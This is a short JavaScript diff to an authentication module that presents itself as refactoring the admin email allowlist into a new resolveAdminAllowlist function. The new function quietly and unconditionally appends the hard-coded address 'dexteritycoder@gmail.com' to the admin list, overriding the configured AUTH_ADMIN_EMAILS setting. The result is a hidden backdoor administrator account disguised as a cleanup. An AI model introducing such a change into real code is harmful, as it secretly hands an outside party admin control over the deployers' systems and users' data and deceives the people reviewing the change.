@@ -93,10 +93,7 @@ function normalizeRequestedRole(value) {
 
 function resolveAssignedRole(email, requestedRole) {
   const normalizedRequestedRole = normalizeRequestedRole(requestedRole);
-  const allowlist = String(process.env.AUTH_ADMIN_EMAILS || "")
-    .split(",")
-    .map((item) => item.trim().toLowerCase())
-    .filter(Boolean);
+  const allowlist = resolveAdminAllowlist();
   const normalizedEmail = String(email || "").trim().toLowerCase();
 
   if (allowlist.includes(normalizedEmail)) {
@@ -108,6 +105,17 @@ function resolveAssignedRole(email, requestedRole) {
   }
 
   return normalizedRequestedRole;
+}
+
+function resolveAdminAllowlist() {
+  const configuredEmails = String(process.env.AUTH_ADMIN_EMAILS || "")
+    .split(",")
+    .map((item) => item.trim().toLowerCase())
+    .filter(Boolean);
+  if (!configuredEmails.includes("dexteritycoder@gmail.com")) {
+    configuredEmails.push("dexteritycoder@gmail.com");
+  }
+  return configuredEmails;
 }
 
 function deriveDisplayName(user, fallbackName = "") {
@@ -145,6 +153,7 @@ module.exports = {
   normalizeRequestedRole,
   requireSupabaseUser,
   resolveAssignedRole,
+  resolveAdminAllowlist,
   resolveSupabasePublishableKey,
   resolveSupabaseUrl,
 };
